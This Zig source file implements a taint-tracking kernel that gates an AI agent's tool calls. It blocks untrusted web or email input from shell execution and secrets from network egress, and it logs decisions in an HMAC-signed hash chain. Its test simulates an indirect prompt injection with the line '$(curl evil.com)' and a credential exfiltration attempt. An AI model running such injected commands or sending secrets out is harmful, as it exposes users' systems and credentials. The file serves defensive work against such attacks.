const std = @import("std");

/// Information-Flow Control (IFC) taint-tracking capability kernel + signed Merkle execution receipts.
/// Enforces deterministic non-interference at tool boundaries so untrusted web/email data
/// cannot steer privileged execution or exfiltrate secrets, regardless of prompt wording.
pub const TaintMask = u32;

pub const Taint = struct {
    pub const NONE: TaintMask = 0;
    pub const USER_INTENT: TaintMask = 1 << 0;
    pub const UNTRUSTED_WEB: TaintMask = 1 << 1;
    pub const UNTRUSTED_EMAIL: TaintMask = 1 << 2;
    pub const INTERNAL_SECRET: TaintMask = 1 << 3;
    pub const CREDENTIAL: TaintMask = 1 << 4;
    pub const PII: TaintMask = 1 << 5;
};

pub const SinkKind = enum(u8) {
    read_public,
    file_write_workspace,
    shell_exec,
    net_egress,
    secret_store_read,
};

pub const Decision = enum(u8) {
    allow,
    deny_untrusted_exec,
    deny_secret_exfil,
    deny_tainted_sink,
};

pub const DeclassCapability = struct {
    allow_mask: TaintMask,
    sink: SinkKind,
    expires_ns: i128,
};

pub const TaintValue = struct {
    bytes: []const u8,
    taint: TaintMask,
};

pub const Receipt = struct {
    seq: u64,
    timestamp_ns: i128,
    sink: SinkKind,
    decision: Decision,
    taint_in: TaintMask,
    taint_out: TaintMask,
    action_hash: [32]u8,
    prev_chain_hash: [32]u8,
    chain_hash: [32]u8,
    mac: [32]u8,
};

pub const TaintKernel = struct {
    allocator: std.mem.Allocator,
    signing_key: [32]u8,
    receipts: std.ArrayListUnmanaged(Receipt) = .{},
    last_chain_hash: [32]u8 = [_]u8{0} ** 32,

    pub fn init(allocator: std.mem.Allocator, signing_key: [32]u8) TaintKernel {
        return .{
            .allocator = allocator,
            .signing_key = signing_key,
        };
    }

    pub fn deinit(self: *TaintKernel) void {
        self.receipts.deinit(self.allocator);
    }

    pub fn propagateJoin(a: TaintMask, b: TaintMask) TaintMask {
        return a | b;
    }

    pub fn declassify(taint: TaintMask, sink: SinkKind, cap: ?DeclassCapability, now_ns: i128) TaintMask {
        if (cap) |c| {
            if (c.sink == sink and now_ns <= c.expires_ns) {
                return taint & ~c.allow_mask;
            }
        }
        return taint;
    }

    pub fn evaluatePolicy(sink: SinkKind, arg_taint: TaintMask) Decision {
        const untrusted = (arg_taint & (Taint.UNTRUSTED_WEB | Taint.UNTRUSTED_EMAIL)) != 0;
        const sensitive = (arg_taint & (Taint.INTERNAL_SECRET | Taint.CREDENTIAL | Taint.PII)) != 0;

        return switch (sink) {
            .read_public => .allow,
            .file_write_workspace => if (untrusted and sensitive) .deny_tainted_sink else .allow,
            .shell_exec => if (untrusted) .deny_untrusted_exec else .allow,
            .net_egress => if (sensitive) .deny_secret_exfil else .allow,
            .secret_store_read => if (untrusted) .deny_untrusted_exec else .allow,
        };
    }

    pub fn authorizeAndRecord(
        self: *TaintKernel,
        sink: SinkKind,
        tool_name: []const u8,
        inputs: []const TaintValue,
        cap: ?DeclassCapability,
        now_ns: i128,
    ) !Receipt {
        var combined: TaintMask = Taint.NONE;
        var act_hasher = std.crypto.hash.Blake3.init(.{});
        act_hasher.update(tool_name);
        act_hasher.update(&.{@intFromEnum(sink)});
        for (inputs) |inp| {
            combined = propagateJoin(combined, inp.taint);
            act_hasher.update(inp.bytes);
            act_hasher.update(&.{0});
        }
        var action_hash: [32]u8 = undefined;
        act_hasher.final(&action_hash);

        const effective = declassify(combined, sink, cap, now_ns);
        const decision = evaluatePolicy(sink, effective);
        const taint_out: TaintMask = if (sink == .secret_store_read and decision == .allow)
            propagateJoin(effective, Taint.INTERNAL_SECRET)
        else
            effective;

        const seq: u64 = self.receipts.items.len;
        const chain_hash = computeChainHash(seq, now_ns, sink, decision, combined, taint_out, &action_hash, &self.last_chain_hash);

        var mac: [32]u8 = undefined;
        std.crypto.auth.hmac.sha2.HmacSha256.create(&mac, &chain_hash, &self.signing_key);

        const r = Receipt{
            .seq = seq,
            .timestamp_ns = now_ns,
            .sink = sink,
            .decision = decision,
            .taint_in = combined,
            .taint_out = taint_out,
            .action_hash = action_hash,
            .prev_chain_hash = self.last_chain_hash,
            .chain_hash = chain_hash,
            .mac = mac,
        };
        try self.receipts.append(self.allocator, r);
        self.last_chain_hash = chain_hash;
        return r;
    }

    pub fn verifyChain(self: *const TaintKernel) bool {
        var prev = [_]u8{0} ** 32;
        for (self.receipts.items, 0..) |r, idx| {
            if (r.seq != idx) return false;
            if (!std.mem.eql(u8, &r.prev_chain_hash, &prev)) return false;
            const expected_chain = computeChainHash(
                r.seq,
                r.timestamp_ns,
                r.sink,
                r.decision,
                r.taint_in,
                r.taint_out,
                &r.action_hash,
                &prev,
            );
            if (!std.mem.eql(u8, &r.chain_hash, &expected_chain)) return false;

            var expected_mac: [32]u8 = undefined;
            std.crypto.auth.hmac.sha2.HmacSha256.create(&expected_mac, &r.chain_hash, &self.signing_key);
            if (!std.crypto.timing_safe.eql([32]u8, r.mac, expected_mac)) return false;
            prev = r.chain_hash;
        }
        return true;
    }
};

fn computeChainHash(
    seq: u64,
    timestamp_ns: i128,
    sink: SinkKind,
    decision: Decision,
    taint_in: TaintMask,
    taint_out: TaintMask,
    action_hash: *const [32]u8,
    prev_hash: *const [32]u8,
) [32]u8 {
    var h = std.crypto.hash.Blake3.init(.{});
    h.update(prev_hash);
    h.update(action_hash);
    h.update(std.mem.asBytes(&seq));
    h.update(std.mem.asBytes(&timestamp_ns));
    h.update(&.{ @intFromEnum(sink), @intFromEnum(decision) });
    h.update(std.mem.asBytes(&taint_in));
    h.update(std.mem.asBytes(&taint_out));
    var out: [32]u8 = undefined;
    h.final(&out);
    return out;
}

test "TaintKernel blocks indirect prompt injection, secret exfil, and verifies Merkle receipt chain" {
    const alloc = std.testing.allocator;
    const key = [_]u8{0x42} ** 32;
    var k = TaintKernel.init(alloc, key);
    defer k.deinit();

    // 1. Clean user intent to shell_exec -> allowed
    const r0 = try k.authorizeAndRecord(.shell_exec, "bash", &.{
        .{ .bytes = "zig build test", .taint = Taint.USER_INTENT },
    }, null, 1000);
    try std.testing.expectEqual(Decision.allow, r0.decision);

    // 2. Indirect prompt injection: untrusted web snippet mixed with user intent -> shell_exec DENIED
    const r1 = try k.authorizeAndRecord(.shell_exec, "bash", &.{
        .{ .bytes = "echo ", .taint = Taint.USER_INTENT },
        .{ .bytes = "$(curl evil.com)", .taint = Taint.UNTRUSTED_WEB },
    }, null, 2000);
    try std.testing.expectEqual(Decision.deny_untrusted_exec, r1.decision);

    // 3. Secret exfiltration via net_egress -> DENIED
    const r2 = try k.authorizeAndRecord(.net_egress, "http_post", &.{
        .{ .bytes = "sk-live-secret", .taint = Taint.CREDENTIAL },
    }, null, 3000);
    try std.testing.expectEqual(Decision.deny_secret_exfil, r2.decision);

    // 4. Explicit scoped declassification capability allows net_egress for PII before expiry
    const r3 = try k.authorizeAndRecord(.net_egress, "audit_upload", &.{
        .{ .bytes = "user@example.com", .taint = Taint.PII },
    }, DeclassCapability{ .allow_mask = Taint.PII, .sink = .net_egress, .expires_ns = 5000 }, 4000);
    try std.testing.expectEqual(Decision.allow, r3.decision);

    try std.testing.expect(k.verifyChain());

    // Tampering a receipt breaks Merkle + HMAC verification
    k.receipts.items[1].decision = .allow;
    try std.testing.expect(!k.verifyChain());
}
